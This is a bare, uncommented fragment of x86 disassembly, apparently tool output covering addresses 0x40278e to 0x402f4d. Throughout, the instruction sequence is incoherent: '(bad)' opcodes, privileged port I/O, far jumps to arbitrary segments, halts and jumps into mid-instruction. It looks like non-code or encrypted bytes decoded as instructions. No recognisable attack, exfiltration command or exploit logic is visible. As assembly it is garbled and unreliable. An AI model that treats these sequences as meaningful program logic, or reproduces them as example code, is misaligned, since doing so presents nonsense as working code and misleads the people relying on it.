  40278e:	adc    DWORD PTR [ebp+0x3d],ebx
  402791:	xchg   edx,eax
  402792:	outs   dx,BYTE PTR ds:[esi]
  402793:	je     0x4027d9
  402795:	pop    ecx
  402796:	mov    cl,0x21
  402798:	dec    eax
  402799:	fs pop esp
  40279b:	inc    edx
  40279c:	fnsave ds:0x41355f52
  4027a2:	sbb    edx,esi
  4027a4:	add    eax,0x39f2bdff
  4027a9:	aad    0x73
  4027ab:	pop    edi
  4027ac:	xchg   ecx,eax
  4027ad:	dec    edx
  4027ae:	fist   WORD PTR [eax-0x27]
  4027b1:	std    
  4027b2:	fidivr DWORD PTR [edx+0xd]
  4027b5:	ret    0x64ca
  4027b8:	outs   dx,BYTE PTR ds:[esi]
  4027b9:	or     al,BYTE PTR [eax]
  4027bb:	popa   
  4027bc:	add    dh,BYTE PTR [ecx-0x33487a6e]
  4027c2:	push   ebp
  4027c3:	push   ecx
  4027c4:	push   ecx
  4027c5:	jbe    0x4027c0
  4027c7:	push   0x1f1bd79b
  4027cc:	sub    esp,DWORD PTR [eax-0x4f]
  4027cf:	jecxz  0x40283d
  4027d1:	jge    0x402782
  4027d3:	jno    0x402783
  4027d5:	int    0x39
  4027d7:	xor    al,0xb0
  4027d9:	aad    0x9d
  4027db:	mov    ebp,0x90bf2326
  4027e0:	fistp  QWORD PTR [eax]
  4027e2:	icebp  
  4027e3:	inc    ebx
  4027e4:	(bad)  
  4027e5:	jg     0x40283f
  4027e7:	pusha  
  4027e8:	loopne 0x4027a3
  4027ea:	mov    ds:0x70af270b,eax
  4027ef:	aaa    
  4027f0:	jp     0x402789
  4027f2:	and    ch,BYTE PTR [esi+0x42]
  4027f5:	dec    ecx
  4027f6:	rol    BYTE PTR [ebx],0x73
  4027f9:	mov    gs,WORD PTR [ecx+eiz*4+0x7b]
  4027fd:	jbe    0x402879
  4027ff:	cmp    al,0xf2
  402801:	mov    esp,DWORD PTR [ebx-0x26]
  402804:	int3   
  402805:	pop    esp
  402806:	ss xchg edi,eax
  402808:	push   0x53
  40280a:	outs   dx,DWORD PTR ds:[esi]
  40280b:	(bad)  
  40280c:	sub    ebp,DWORD PTR [edx+0x559443f]
  402812:	outs   dx,BYTE PTR ds:[esi]
  402813:	xor    ebx,0x65
  402816:	sub    eax,0xe1e3d0dc
  40281b:	or     eax,0xfe6a7c51
  402820:	cmc    
  402821:	call   0x233069c
  402826:	stos   DWORD PTR es:[edi],eax
  402827:	push   eax
  402828:	rsqrtps xmm6,XMMWORD PTR [edx]
  40282b:	inc    ebx
  40282c:	xor    dl,BYTE PTR [edx+0x569bbe94]
  402832:	and    BYTE PTR [esi+0x6d],dl
  402835:	nop
  402836:	xor    al,0x10
  402838:	mov    ecx,0x4ca7bb47
  40283d:	sub    al,0xc1
  40283f:	xchg   ebp,eax
  402840:	and    edx,ebx
  402842:	out    0xbf,al
  402844:	or     DWORD PTR [eax+0x37],ecx
  402847:	sub    eax,0xc57bbea6
  40284c:	jmp    0x40283b
  40284e:	jae    0x40285e
  402850:	lods   eax,DWORD PTR ds:[esi]
  402851:	lods   eax,DWORD PTR ds:[esi]
  402852:	fnsave [edi-0x49]
  402855:	adc    eax,DWORD PTR [ebx+0x3]
  402858:	inc    esi
  402859:	mov    dh,0xb4
  40285b:	dec    ebx
  40285c:	push   eax
  40285d:	loope  0x4028d7
  40285f:	mov    edi,0x71adc251
  402865:	jmp    0x402862
  402867:	xchg   bl,ah
  402869:	cmp    dh,BYTE PTR [ecx-0x53ed42e]
  40286f:	mov    ebx,edx
  402871:	mov    ds:0x6bc6a96c,al
  402876:	mov    dh,0x8f
  402878:	fld    st(3)
  40287a:	add    dl,BYTE PTR [ebx-0x21a3dc7]
  402880:	pop    eax
  402881:	jnp    0x402888
  402883:	xchg   ebp,eax
  402884:	pop    edi
  402885:	lods   al,BYTE PTR ds:[esi]
  402886:	popa   
  402887:	sahf   
  402888:	add    BYTE PTR [ebx+0x48],al
  40288b:	push   eax
  40288c:	xor    DWORD PTR [esi-0x1d839df5],ecx
  402892:	lods   al,BYTE PTR ds:[esi]
  402893:	pop    edi
  402894:	call   0x8a3e8aad
  402899:	fidivr DWORD PTR ds:0x613b7a0d
  40289f:	pop    ss
  4028a0:	cs stc 
  4028a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4028a3:	fbstp  TBYTE PTR [esp+ebp*8+0x832b218]
  4028aa:	add    cl,BYTE PTR [eax]
  4028ac:	call   0x902e17b2
  4028b1:	in     eax,0x50
  4028b3:	test   DWORD PTR ds:0x7d1b600e,esi
  4028b9:	hlt    
  4028ba:	popf   
  4028bb:	pop    ebp
  4028bc:	inc    esp
  4028bd:	cwde   
  4028be:	mov    dh,BYTE PTR [esi+ecx*2-0x3ecad198]
  4028c5:	push   es
  4028c6:	mov    bl,0x84
  4028c8:	int    0x3
  4028ca:	fs cld 
  4028cc:	sub    DWORD PTR [edx-0x244d5f39],ebx
  4028d2:	pop    esp
  4028d3:	ss push es
  4028d5:	xchg   BYTE PTR [esi+0x3a],bh
  4028d8:	or     dl,bh
  4028da:	retf   0x6133
  4028dd:	and    eax,0x759b59e3
  4028e2:	mov    dl,0x9
  4028e4:	adc    eax,0xee3b148a
  4028e9:	fst    DWORD PTR [eax+0x72]
  4028ec:	ret    
  4028ed:	dec    eax
  4028ee:	call   0x296b5e59
  4028f3:	jg     0x40292b
  4028f5:	mov    ch,0x63
  4028f7:	mov    al,0x8
  4028f9:	add    ecx,ebx
  4028fb:	mov    dl,0x4e
  4028fd:	or     dh,ch
  4028ff:	push   0x39554df3
  402904:	sti    
  402905:	clc    
  402906:	add    BYTE PTR [eax],0xe9
  402909:	add    al,0xe3
  40290b:	(bad)  
  40290d:	add    al,0x52
  40290f:	push   0x1d
  402911:	aaa    
  402912:	or     DWORD PTR [ecx],edi
  402914:	xchg   esp,eax
  402915:	mov    ah,0x85
  402917:	cli    
  402918:	xor    ebp,ebp
  40291a:	add    esp,DWORD PTR [esi+0x2b470d52]
  402920:	sub    bl,BYTE PTR gs:[eax+ebx*1+0x1f42b70d]
  402928:	mov    ebx,0x2c49fc7b
  40292d:	ins    BYTE PTR es:[edi],dx
  40292e:	mov    ah,0xc
  402930:	inc    edx
  402931:	pop    eax
  402932:	mov    ebx,0xa5405694
  402937:	repz in eax,dx
  402939:	adc    DWORD PTR [eax],edx
  40293b:	mov    edi,esp
  40293d:	mov    cl,0x8f
  40293f:	xchg   esp,eax
  402940:	sub    al,BYTE PTR [edx]
  402942:	fsubr  st(2),st
  402944:	scas   eax,DWORD PTR es:[edi]
  402945:	into   
  402946:	clc    
  402947:	pop    edx
  402948:	and    DWORD PTR [esp+eax*2],eax
  40294b:	std    
  40294c:	ror    BYTE PTR [ebp+0x4c11fa0b],0x84
  402953:	mov    bl,0x89
  402955:	xor    al,0xed
  402957:	sub    DWORD PTR [esi+0x3e],ebx
  40295a:	cs pusha 
  40295c:	cdq    
  40295d:	mov    al,0x2b
  40295f:	sbb    ebx,ebx
  402961:	inc    esi
  402962:	pop    esi
  402963:	or     DWORD PTR [ebp-0x3ce059cc],0xffffffc7
  40296a:	cdq    
  40296b:	dec    ebx
  40296c:	ss in  eax,0xa6
  40296f:	inc    eax
  402970:	mov    ah,cl
  402972:	in     al,0x44
  402974:	mov    edx,0x4701416d
  402979:	loope  0x4029a7
  40297b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40297c:	or     BYTE PTR [ecx],0x34
  40297f:	sbb    al,0x7e
  402981:	scas   eax,DWORD PTR es:[edi]
  402982:	retf   
  402983:	push   edi
  402984:	or     al,0xe
  402986:	push   ebp
  402987:	jae    0x40291c
  402989:	(bad)  
  40298a:	cld    
  40298b:	mov    edx,0xfd9c2cde
  402990:	and    DWORD PTR [edx],ecx
  402992:	pop    ebx
  402993:	adc    ch,BYTE PTR [ebx]
  402995:	dec    edi
  402996:	xchg   esp,eax
  402997:	ja     0x4029d5
  402999:	(bad)  [ecx+esi*4]
  40299c:	sub    al,0x7a
  40299e:	sub    eax,0x4d271c70
  4029a3:	jge    0x40296f
  4029a5:	sahf   
  4029a6:	inc    edi
  4029a7:	stos   BYTE PTR es:[edi],al
  4029a8:	cmc    
  4029a9:	sub    ecx,DWORD PTR [ecx-0x5190b08f]
  4029af:	les    edi,FWORD PTR [ecx+0x5b]
  4029b2:	push   edx
  4029b3:	sti    
  4029b4:	ins    BYTE PTR es:[edi],dx
  4029b5:	sub    eax,DWORD PTR [ecx+0x57]
  4029b8:	arpl   WORD PTR ds:0x27d068d4,bp
  4029be:	push   edx
  4029bf:	adc    al,0x37
  4029c1:	arpl   WORD PTR [eax-0x22ba91a3],si
  4029c7:	push   es
  4029c8:	sti    
  4029c9:	lods   al,BYTE PTR ds:[esi]
  4029ca:	(bad)  
  4029cb:	cld    
  4029cc:	retf   0x3e67
  4029cf:	stos   BYTE PTR es:[edi],al
  4029d0:	cmc    
  4029d1:	fwait
  4029d2:	add    al,0x9f
  4029d4:	push   edi
  4029d5:	sahf   
  4029d6:	inc    al
  4029d8:	ja     0x4029e9
  4029da:	into   
  4029db:	jmp    0x4ea9:0x3251da7
  4029e2:	fild   QWORD PTR [ecx]
  4029e4:	inc    esp
  4029e5:	shr    esp,1
  4029e7:	sti    
  4029e8:	cdq    
  4029e9:	push   es
  4029ea:	adc    eax,esp
  4029ec:	daa    
  4029ed:	and    BYTE PTR [edx],0x68
  4029f0:	jge    0x4029ad
  4029f2:	push   ss
  4029f3:	inc    ebp
  4029f4:	into   
  4029f5:	and    ch,BYTE PTR [eax+0x1d]
  4029f8:	int    0xc7
  4029fa:	outs   dx,DWORD PTR ds:[esi]
  4029fb:	mov    ah,0x4d
  4029fd:	add    esi,DWORD PTR [ecx+0x3]
  402a00:	out    dx,al
  402a01:	sub    edx,DWORD PTR [ebx-0x5a0598ce]
  402a07:	rcl    BYTE PTR [edx+0x67],0x97
  402a0b:	jl     0x4029c9
  402a0d:	psubusw mm1,QWORD PTR [esi+0x749d19d1]
  402a14:	xor    cl,BYTE PTR [ebp+0x31ef7324]
  402a1a:	push   edi
  402a1b:	shl    ecx,0x11
  402a1e:	retf   0x2874
  402a21:	inc    esi
  402a22:	cmp    eax,0x55d51c11
  402a27:	call   0x8cba:0x4691a05e
  402a2e:	mov    ds:0x6ef4f632,eax
  402a33:	test   BYTE PTR [ebp+edx*8+0x70],ch
  402a37:	test   DWORD PTR [edx],0x73d3e456
  402a3d:	push   es
  402a3e:	jbe    0x402a4a
  402a40:	fmul   QWORD PTR [eax-0x6d]
  402a43:	mov    esp,0x8bde981f
  402a48:	retf   
  402a49:	dec    edx
  402a4a:	or     DWORD PTR ds:[eax-0x73],edi
  402a4e:	ja     0x4029e2
  402a50:	xchg   edx,eax
  402a51:	cld    
  402a52:	mov    al,ds:0x26c44630
  402a57:	shl    cl,0xe6
  402a5a:	jp     0x402a0a
  402a5c:	in     al,0xcc
  402a5e:	push   esp
  402a5f:	rcl    BYTE PTR [edx-0x56],0xdb
  402a63:	enter  0x3294,0xab
  402a67:	xchg   edi,eax
  402a68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402a69:	dec    edx
  402a6a:	int    0xe6
  402a6c:	rcl    eax,0x9
  402a6f:	dec    edx
  402a70:	test   BYTE PTR [ecx-0x2e],0x14
  402a74:	ret    
  402a75:	nop
  402a76:	and    al,0x15
  402a78:	aas    
  402a79:	lods   eax,DWORD PTR ds:[esi]
  402a7a:	popa   
  402a7b:	jl     0x402a7a
  402a7d:	or     esp,DWORD PTR [esi-0x19]
  402a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402a81:	lods   al,BYTE PTR ds:[esi]
  402a82:	mov    dl,0x8e
  402a84:	jmp    0x402a15
  402a86:	pop    esi
  402a87:	mov    bh,dh
  402a89:	out    dx,al
  402a8a:	mov    ebx,0x417ae136
  402a8f:	jmp    0xe3bd9a8e
  402a94:	gs jns 0x402aba
  402a97:	push   edi
  402a98:	out    dx,al
  402a99:	sar    DWORD PTR [esi-0x5a],0xd8
  402a9d:	mov    ds:0xaf1cde06,al
  402aa2:	in     al,dx
  402aa3:	mov    WORD PTR [edx],ds
  402aa5:	push   ds
  402aa6:	mov    bl,0x79
  402aa8:	stc    
  402aa9:	rcr    dh,1
  402aab:	out    dx,al
  402aac:	push   eax
  402aad:	sub    ah,dh
  402aaf:	out    dx,al
  402ab0:	loop   0x402a3c
  402ab2:	push   0x23
  402ab4:	inc    eax
  402ab5:	dec    ecx
  402ab6:	test   al,0x22
  402ab8:	mov    bh,0x39
  402aba:	mov    BYTE PTR [ecx-0x56],al
  402abd:	aas    
  402abe:	mov    ss,WORD PTR [ebp+0xd8b5152]
  402ac4:	movlps xmm2,QWORD PTR [ecx]
  402ac7:	lds    ebp,FWORD PTR [eax]
  402ac9:	aas    
  402aca:	mov    al,ds:0x41bd8526
  402acf:	scas   al,BYTE PTR es:[edi]
  402ad0:	ins    DWORD PTR es:[edi],dx
  402ad1:	cmc    
  402ad2:	adc    al,0x7b
  402ad4:	or     DWORD PTR [ebx+esi*4-0x1f],0x7dcaeb63
  402adc:	aad    0xed
  402ade:	or     eax,0x53262693
  402ae3:	ror    DWORD PTR [ecx+edi*2+0x58ad3b7f],cl
  402aea:	pop    ss
  402aeb:	shr    BYTE PTR [eax+ecx*4-0x6471dbb2],1
  402af2:	addr16 push edi
  402af4:	fdivr  DWORD PTR [ebx-0x59]
  402af7:	mov    bl,0x5c
  402af9:	ds xchg ebp,eax
  402afb:	lods   al,BYTE PTR ds:[esi]
  402afc:	aaa    
  402afd:	push   edi
  402afe:	mov    ebp,0x2d275a1a
  402b03:	cs and eax,0x620734a7
  402b09:	inc    ebp
  402b0a:	into   
  402b0b:	dec    edx
  402b0c:	inc    edi
  402b0d:	pop    edi
  402b0e:	scas   al,BYTE PTR es:[edi]
  402b0f:	and    esp,DWORD PTR [edi]
  402b11:	push   edx
  402b12:	hlt    
  402b13:	pop    ss
  402b14:	push   edi
  402b15:	ins    DWORD PTR es:[edi],dx
  402b16:	cmp    DWORD PTR [ebp+0x354e019],esp
  402b1c:	pop    DWORD PTR ds:[ecx]
  402b1f:	fnstcw WORD PTR [edx-0x7ee357d8]
  402b25:	adc    BYTE PTR [eax+0x6841f967],dl
  402b2b:	mul    edx
  402b2d:	mov    ebp,0x9eda914c
  402b32:	in     eax,0xf0
  402b34:	in     eax,0xb
  402b36:	test   ch,ch
  402b38:	in     al,dx
  402b39:	add    ah,BYTE PTR [edi-0x11ae5a73]
  402b3f:	fst    QWORD PTR [ebx-0x64]
  402b42:	cmp    eax,0xfc05a65c
  402b47:	push   edi
  402b48:	mov    al,ds:0x361b1d44
  402b4d:	mov    ds:0xaf3fafd1,al
  402b52:	adc    eax,0xcef23869
  402b57:	jae    0x402bb1
  402b59:	ins    DWORD PTR es:[edi],dx
  402b5a:	dec    ecx
  402b5b:	lea    eax,[ebp-0x8f95e5a]
  402b61:	cmc    
  402b62:	loop   0x402ae7
  402b64:	rol    DWORD PTR [ebp+0x1846776b],1
  402b6a:	push   edx
  402b6b:	in     eax,0x6d
  402b6d:	das    
  402b6e:	out    dx,al
  402b6f:	xchg   esi,eax
  402b70:	or     eax,0xc7dfa143
  402b75:	push   ss
  402b76:	ds push edx
  402b78:	out    dx,eax
  402b79:	imul   ch
  402b7b:	lds    edi,FWORD PTR [eax+0x7f]
  402b7e:	push   edi
  402b7f:	scas   eax,DWORD PTR es:[edi]
  402b80:	dec    edi
  402b81:	xchg   DWORD PTR [ecx-0x46],esp
  402b84:	jg     0x402bde
  402b86:	adc    esp,esp
  402b88:	mov    edi,DWORD PTR [eax+ebx*4-0x27]
  402b8c:	xchg   edx,eax
  402b8d:	stc    
  402b8e:	dec    edx
  402b8f:	test   al,0xa0
  402b91:	inc    eax
  402b92:	and    al,0xda
  402b94:	pop    es
  402b95:	adc    BYTE PTR [eax-0x62],ah
  402b98:	xor    BYTE PTR [ebp+0x41f7b6a0],bh
  402b9e:	dec    esp
  402b9f:	mov    ch,0xec
  402ba1:	dec    esi
  402ba2:	repnz adc al,0x23
  402ba5:	imul   esp,DWORD PTR [ebp+0x7],0x5f
  402ba9:	lods   eax,DWORD PTR ds:[esi]
  402baa:	xchg   esp,eax
  402bab:	add    BYTE PTR [edx+0xcdad7b7],ah
  402bb1:	repz push ss
  402bb3:	push   ds
  402bb4:	jg     0x402b71
  402bb6:	imul   esp,DWORD PTR [ebp-0x73],0x14
  402bba:	sub    al,0xb1
  402bbc:	pop    ss
  402bbd:	cmp    eax,0xd5cd0377
  402bc2:	int3   
  402bc3:	mov    ds:0x8ec2610f,eax
  402bc8:	test   BYTE PTR [ecx-0x50c78a1a],bl
  402bce:	test   BYTE PTR [edx+ebp*1-0x7f],bl
  402bd2:	xor    al,0x16
  402bd4:	jmp    0x3bf6cc73
  402bd9:	xchg   edi,eax
  402bda:	push   0x63
  402bdc:	retf   
  402bdd:	cli    
  402bde:	or     BYTE PTR [edi-0x1f],cl
  402be1:	add    al,bh
  402be3:	push   es
  402be4:	jb     0x402b6f
  402be6:	in     al,0x77
  402be8:	adc    ebx,DWORD PTR [ecx]
  402bea:	mov    bl,0x84
  402bec:	xor    bh,0x83
  402bef:	test   eax,0x459deea5
  402bf4:	dec    ebp
  402bf5:	nop
  402bf6:	jbe    0x402b9b
  402bf8:	cmp    al,0x1d
  402bfa:	mov    DWORD PTR [ecx],edx
  402bfc:	sbb    BYTE PTR [ebx],dl
  402bfe:	cmp    DWORD PTR [ecx-0x7e],0xc46267a7
  402c05:	daa    
  402c06:	js     0x402b92
  402c08:	sub    al,0x46
  402c0a:	pusha  
  402c0b:	add    eax,0x3ebfd05
  402c10:	mov    ebp,ds
  402c12:	push   ecx
  402c13:	cmp    al,0xa
  402c15:	int    0xa6
  402c17:	or     al,0xf1
  402c19:	xor    DWORD PTR [eax-0x5c],edx
  402c1c:	dec    edx
  402c1d:	repnz scas al,BYTE PTR es:[edi]
  402c1f:	mov    ebx,DWORD PTR [ecx]
  402c21:	mov    ah,0xf7
  402c23:	(bad)  
  402c24:	jle    0x402ba6
  402c26:	ret    0x4042
  402c29:	ss aad 0x1b
  402c2c:	push   ebp
  402c2d:	sbb    esp,DWORD PTR [ebp+eax*2+0x75cc4491]
  402c34:	sub    al,0x91
  402c36:	jmp    0x402c2b
  402c38:	add    edx,ebx
  402c3a:	sbb    bh,BYTE PTR [esp+edi*4+0x2406d056]
  402c41:	loope  0x402bc8
  402c43:	ror    BYTE PTR [ecx+0x7b],0xa5
  402c47:	sbb    DWORD PTR [eax],0x5fff25b
  402c4d:	push   edi
  402c4e:	pop    esp
  402c4f:	repz add DWORD PTR [ebp-0xe9016cf],esp
  402c56:	mov    edx,0xb5de977f
  402c5b:	pusha  
  402c5c:	(bad)  
  402c5d:	or     esp,DWORD PTR [ebx+0x43]
  402c60:	pop    ebx
  402c61:	fadd   QWORD PTR [edx]
  402c63:	hlt    
  402c64:	push   edi
  402c65:	push   eax
  402c66:	stc    
  402c67:	push   ecx
  402c68:	push   esp
  402c69:	aaa    
  402c6a:	(bad)  
  402c6b:	int    0x67
  402c6d:	add    al,0x25
  402c6f:	xchg   ecx,eax
  402c70:	xor    al,al
  402c72:	sahf   
  402c73:	push   0x92417896
  402c78:	mov    al,0x9e
  402c7a:	push   ebp
  402c7b:	enter  0x21c3,0x9d
  402c7f:	js     0x402c16
  402c81:	mov    dl,0xb9
  402c83:	(bad)  
  402c84:	xchg   ecx,eax
  402c85:	and    dl,dh
  402c87:	cdq    
  402c88:	mov    al,0xe6
  402c8a:	scas   al,BYTE PTR es:[edi]
  402c8b:	or     BYTE PTR [ecx-0x77a3d45e],ch
  402c91:	and    eax,0x688e2e97
  402c96:	mov    eax,0x2b7bbaec
  402c9b:	jne    0x402d19
  402c9d:	in     al,0x54
  402c9f:	sahf   
  402ca0:	jmp    0x7127:0x33a63eec
  402ca7:	sbb    eax,0x5eff96a4
  402cac:	fistp  DWORD PTR [esi+0x5b]
  402caf:	add    esi,edx
  402cb1:	push   0xffffffba
  402cb3:	mov    esp,0xc1335809
  402cb8:	jns    0x402cfc
  402cba:	cmp    ecx,DWORD PTR [ecx]
  402cbc:	pop    ebp
  402cbe:	push   0x3f
  402cc0:	mov    ebp,0x7a5044ac
  402cc5:	jae    0x402c4e
  402cc7:	or     eax,0x2e2854ee
  402ccc:	sbb    al,0x31
  402cce:	xor    bl,BYTE PTR [eax]
  402cd0:	push   DWORD PTR [edx]
  402cd2:	adc    cl,BYTE PTR [ebx+0x2a]
  402cd5:	sub    al,0x3f
  402cd7:	das    
  402cd8:	adc    eax,0x196bd0a2
  402cdd:	and    bh,BYTE PTR [eax+0x36]
  402ce0:	imul   ebx,edx,0x7a
  402ce3:	lods   eax,DWORD PTR ds:[esi]
  402ce4:	call   FWORD PTR [ebx+edi*8]
  402ce7:	fist   DWORD PTR [edi+0xd]
  402cea:	cmp    DWORD PTR ds:0x629835f0,esi
  402cf0:	and    eax,0x3991e40f
  402cf5:	in     al,0xe3
  402cf7:	add    BYTE PTR [edi],ch
  402cf9:	xchg   esi,eax
  402cfa:	pusha  
  402cfb:	arpl   WORD PTR [esi],cx
  402cfd:	jge    0x402cd1
  402cff:	jge    0x402cc1
  402d01:	sbb    BYTE PTR [ecx],al
  402d03:	adc    esp,edx
  402d05:	jns    0x402d29
  402d07:	pop    edx
  402d08:	mov    cl,0x3a
  402d0a:	fiadd  DWORD PTR [edx+0x17b8eb87]
  402d10:	das    
  402d11:	rol    BYTE PTR ds:0x1b445f51,0x97
  402d18:	daa    
  402d19:	add    cl,dh
  402d1b:	cmp    al,0x3
  402d1d:	mov    edi,0x778081bb
  402d22:	hlt    
  402d23:	popa   
  402d24:	inc    DWORD PTR [edx+0x11]
  402d27:	ds scas al,BYTE PTR es:[edi]
  402d29:	sar    BYTE PTR ds:0xfef66a1d,0xa7
  402d30:	mov    ebp,0x71fa100e
  402d35:	jmp    0xd00b30f4
  402d3a:	fdiv   DWORD PTR [edi-0x915ce1c]
  402d40:	push   ecx
  402d41:	push   0x7e
  402d43:	inc    edx
  402d44:	dec    edi
  402d45:	mov    bh,0xc4
  402d47:	mov    dl,0x9
  402d49:	inc    esi
  402d4a:	icebp  
  402d4b:	icebp  
  402d4c:	sub    ecx,DWORD PTR [edx+0x1e]
  402d4f:	inc    ecx
  402d50:	jp     0x402d26
  402d52:	pusha  
  402d53:	pop    ss
  402d54:	aaa    
  402d55:	les    ebx,FWORD PTR [edi-0x5d7c4d63]
  402d5b:	out    dx,eax
  402d5c:	cmp    al,0xe5
  402d5e:	inc    ebp
  402d5f:	lods   eax,DWORD PTR ds:[esi]
  402d60:	jb     0x402dc0
  402d62:	push   DWORD PTR ds:0xb802a8e0
  402d68:	add    DWORD PTR ds:0xaa556242,edi
  402d6e:	xor    DWORD PTR [esi-0x4c2feec7],esi
  402d74:	xor    al,0x31
  402d76:	mov    eax,0xa8bf13bd
  402d7b:	and    ebx,ecx
  402d7d:	retf   0x6505
  402d80:	xor    bl,BYTE PTR [edi+eiz*2-0x6b502ed]
  402d87:	rdtsc  
  402d89:	jp     0x402d26
  402d8b:	or     dl,dl
  402d8d:	jno    0x402dac
  402d8f:	mov    WORD PTR [esi],ds
  402d91:	int3   
  402d92:	call   0x98a08747
  402d97:	adc    eax,edi
  402d99:	das    
  402d9a:	mov    ds:0x7b1edbd8,al
  402d9f:	ja     0x402d58
  402da1:	jmp    0x14c6:0xf133ad20
  402da8:	test   BYTE PTR [eax],ah
  402daa:	jne    0x402d91
  402dac:	mov    ebp,0x4d87473a
  402db1:	fucomip st,st(0)
  402db3:	xor    eax,0x4e2aa210
  402db8:	test   eax,0x31301e65
  402dbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402dbe:	cmp    edx,DWORD PTR [esi-0x77]
  402dc1:	dec    ebp
  402dc2:	stc    
  402dc3:	push   0x69
  402dc5:	xchg   ecx,eax
  402dc6:	nop
  402dc7:	jg     0x402d73
  402dc9:	and    ebx,DWORD PTR ds:0xd90f19e
  402dcf:	jno    0x402e1d
  402dd1:	mov    ebx,ebx
  402dd3:	push   ebx
  402dd4:	pop    ebp
  402dd5:	ret    0x9403
  402dd8:	and    BYTE PTR [ecx],al
  402dda:	mov    ecx,0x478cf141
  402ddf:	inc    edi
  402de0:	xor    al,0xd2
  402de2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402de3:	and    esi,DWORD PTR [eax+0x1a7c8682]
  402de9:	sub    eax,0x9b7428dd
  402dee:	cmp    eax,0x5a919707
  402df3:	jmp    0x5aa0:0x215a3b12
  402dfa:	sti    
  402dfb:	sub    ecx,DWORD PTR [esi-0x66]
  402dfe:	sar    BYTE PTR [ebx],0xb6
  402e01:	fstp   TBYTE PTR [edx+0x760360d5]
  402e07:	jo     0x402dfa
  402e09:	add    al,0xb1
  402e0b:	loop   0x402e18
  402e0d:	push   esi
  402e0e:	jns    0x402e26
  402e10:	add    DWORD PTR [ecx+0x3e2cc423],edx
  402e16:	cmp    ch,bh
  402e18:	(bad)  [ebx-0x2c]
  402e1b:	xchg   BYTE PTR [esi-0x34],ch
  402e1e:	ins    DWORD PTR es:[edi],dx
  402e1f:	push   ecx
  402e20:	jne    0x402de8
  402e22:	push   ss
  402e23:	jl     0x402dbd
  402e25:	cs aad 0xb2
  402e28:	inc    ecx
  402e29:	pop    es
  402e2a:	jae    0x402ea3
  402e2c:	ins    DWORD PTR es:[edi],dx
  402e2d:	popa   
  402e2e:	add    edi,DWORD PTR [edi+0x60]
  402e31:	cmp    al,BYTE PTR [ebp-0x3f]
  402e34:	aas    
  402e35:	push   cs
  402e36:	mov    dl,0xeb
  402e38:	and    eax,0x4cc12410
  402e3d:	fnstsw WORD PTR ds:0xee6be763
  402e43:	shl    BYTE PTR [edi-0x18e3c0a5],1
  402e49:	pop    esi
  402e4a:	cmp    al,0x87
  402e4d:	mov    esi,0x38804e2c
  402e52:	jne    0x402e43
  402e54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402e55:	mov    edx,ds
  402e57:	jl     0x402def
  402e59:	mov    edx,0x7e084369
  402e5e:	pop    ecx
  402e5f:	mov    ecx,0xb4f769eb
  402e64:	add    ah,BYTE PTR [eax-0x1b23c3bf]
  402e6a:	je     0x402eca
  402e6c:	sbb    ch,BYTE PTR [ebx+eax*2+0x7076ca02]
  402e73:	jge    0x402ec8
  402e75:	idiv   BYTE PTR [edx]
  402e77:	nop
  402e78:	adc    eax,0x8bb9a079
  402e7d:	mov    dh,0x23
  402e7f:	mov    edi,0x59a26ce0
  402e84:	and    ecx,DWORD PTR [edi-0x76]
  402e87:	jp     0x402e97
  402e89:	jno    0x402ec6
  402e8b:	btr    DWORD PTR [ebx+0x14d422b2],eax
  402e92:	iret   
  402e93:	out    0xc7,al
  402e95:	daa    
  402e96:	or     cl,BYTE PTR [eax+0x544976ef]
  402e9c:	mov    ?,edi
  402e9e:	xchg   esi,eax
  402e9f:	and    ebp,esi
  402ea1:	and    esp,DWORD PTR [esi]
  402ea3:	mov    bh,0xc
  402ea5:	add    al,0x99
  402ea7:	pinsrw mm4,WORD PTR [ebp+0x44fd6a1d],0xb2
  402eaf:	aad    0x3f
  402eb1:	(bad)  
  402eb2:	in     al,0x79
  402eb4:	and    al,0xbd
  402eb6:	xor    eax,0xf94a2e7f
  402ebb:	les    ecx,FWORD PTR [esi]
  402ebd:	scas   eax,DWORD PTR es:[edi]
  402ebe:	out    0x75,al
  402ec0:	mov    WORD PTR [esi],?
  402ec2:	ror    ah,0x6f
  402ec5:	push   edi
  402ec6:	sbb    BYTE PTR [ebp+0x77],0x48
  402eca:	pusha  
  402ecb:	xchg   edx,eax
  402ecc:	xchg   edi,eax
  402ecd:	fsub   QWORD PTR [ecx-0x5b]
  402ed0:	fsub   st,st(3)
  402ed2:	(bad)  
  402ed4:	and    DWORD PTR [edi+0x70b2be8b],edx
  402eda:	cli    
  402edb:	das    
  402edc:	mov    ah,ah
  402ede:	dec    DWORD PTR [esi]
  402ee0:	add    DWORD PTR [eax],ecx
  402ee2:	mov    dh,bl
  402ee4:	push   edi
  402ee5:	in     al,0xbc
  402ee7:	sti    
  402ee8:	sub    ebx,ecx
  402eea:	fs js  0x402ea0
  402eed:	outs   dx,DWORD PTR ds:[esi]
  402eee:	pop    esi
  402eef:	popf   
  402ef0:	ror    DWORD PTR [ebx-0x1a6c308a],0x5c
  402ef7:	(bad)  
  402ef8:	mov    cs,eax
  402efa:	add    eax,0x54b0262
  402eff:	int3   
  402f00:	jp     0x402eb4
  402f02:	xor    al,0xda
  402f04:	mov    esp,DWORD PTR ds:0x76668f75
  402f0a:	push   ds
  402f0b:	ret    0x6216
  402f0e:	loopne 0x402f48
  402f10:	sti    
  402f11:	sahf   
  402f12:	jo     0x402f4e
  402f14:	pop    ebp
  402f15:	pop    edi
  402f16:	push   esi
  402f17:	test   bl,0xde
  402f1a:	mov    ah,0x95
  402f1c:	push   esi
  402f1d:	aaa    
  402f1e:	(bad)  [edx+0x53]
  402f21:	sbb    eax,0x8ab2fd0c
  402f26:	lock jg 0x402eac
  402f29:	mov    eax,0x6c4a7414
  402f2e:	and    edi,DWORD PTR [esi+edx*4+0x5e]
  402f32:	fwait
  402f33:	pop    esi
  402f34:	sub    eax,0x3e122955
  402f39:	xor    ah,ch
  402f3b:	jae    0x402f27
  402f3d:	cmp    eax,edx
  402f3f:	iret   
  402f40:	jne    0x402f09
  402f42:	ins    BYTE PTR es:[edi],dx
  402f43:	(bad)  
  402f44:	fidiv  WORD PTR [esp+ecx*1]
  402f47:	and    eax,0xe9e5b219
  402f4c:	pop    edi
  402f4d:	jle    0x402f8d
